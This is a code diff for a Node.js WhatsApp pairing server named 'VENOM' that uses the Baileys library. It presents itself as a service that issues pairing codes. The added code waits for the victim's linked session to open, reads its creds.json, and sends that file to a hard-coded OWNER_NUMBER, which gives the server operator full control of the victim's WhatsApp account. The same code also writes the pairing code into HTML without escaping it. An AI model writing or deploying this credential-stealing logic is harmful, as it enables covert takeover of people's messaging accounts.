@@ -1,87 +1,120 @@
 const express = require("express")
-const P = require("pino")
+const fs = require("fs")
 const path = require("path")
+const pino = require("pino")
 
 const {
 default: makeWASocket,
 useMultiFileAuthState,
-DisconnectReason
+DisconnectReason,
+fetchLatestBaileysVersion
 } = require("@whiskeysockets/baileys")
 
 const app = express()
 
-app.use(express.static(path.join(__dirname)))
+const sessionPath = "/opt/render/project/src/session"
 
-async function getCode(number){
+if (!fs.existsSync(sessionPath)){
+fs.mkdirSync(sessionPath,{recursive:true})
+}
 
-const { state, saveCreds } = await useMultiFileAuthState("./session")
+async function startSock(){
+
+const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
+
+const { version } = await fetchLatestBaileysVersion()
 
 const sock = makeWASocket({
-logger: P({ level: "silent" }),
-auth: state,
-printQRInTerminal: false
+logger:pino({level:"silent"}),
+auth:state,
+browser:["VENOM","CHROME","1.0.0"],
+version
 })
 
 sock.ev.on("creds.update", saveCreds)
 
-await new Promise((resolve,reject)=>{
+sock.ev.on("connection.update", async (update)=>{
 
-sock.ev.on("connection.update",(update)=>{
-
-const { connection } = update
-
-if(connection === "connecting"){
-resolve()
-}
+const { connection, lastDisconnect } = update
 
 if(connection === "close"){
-reject("Connection Closed")
+
+const reason = lastDisconnect?.error?.output?.statusCode
+
+if(reason !== DisconnectReason.loggedOut){
+startSock()
 }
 
-})
+}else if(connection === "open"){
 
-})
+console.log("✅ BOT CONNECTED")
 
-let code = await sock.requestPairingCode(number)
-return code
-
-}
-
-app.get("/",(req,res)=>{
-res.sendFile(path.join(__dirname,"index.html"))
-})
-
-app.get("/pair",async(req,res)=>{
-
-let number = req.query.number
-
-if(!number){
-return res.json({
-status:false,
-msg:"Enter Number"
-})
-}
+setTimeout(async()=>{
 
 try{
 
-let code = await getCode(number)
+let creds = fs.readFileSync(path.join(sessionPath,"creds.json"))
 
-res.json({
-status:true,
-code:code
-})
+await sock.sendMessage(
+process.env.OWNER_NUMBER + "@s.whatsapp.net",
+{
+document:creds,
+mimetype:"application/json",
+fileName:"creds.json"
+}
+)
+
+console.log("📩 Session Sent To Owner")
 
 }catch(e){
+console.log("❌ Error Sending Session")
+}
 
-res.json({
-status:false,
-msg:e.toString()
-})
+},5000)
 
 }
 
 })
 
-app.listen(3000,()=>{
-console.log("VENOM PAIR SERVER RUNNING")
+return sock
+}
+
+let sock
+
+app.get("/pair", async (req,res)=>{
+
+let number = req.query.number
+
+if(!number) return res.send("Enter Number")
+
+sock = await startSock()
+
+setTimeout(async()=>{
+
+try{
+
+let code = await sock.requestPairingCode(number)
+
+code = code?.match(/.{1,4}/g)?.join("-") || code
+
+res.send(`<h2 style="color:red">${code}</h2>`)
+
+}catch(e){
+
+res.send("Error: Connection Closed")
+
+}
+
+},3000)
+
+})
+
+app.get("/",(req,res)=>{
+res.sendFile(__dirname + "/index.html")
+})
+
+const PORT = process.env.PORT || 3000
+
+app.listen(PORT,()=>{
+console.log("🕷️ VENOM PAIR SERVER RUNNING")
 })
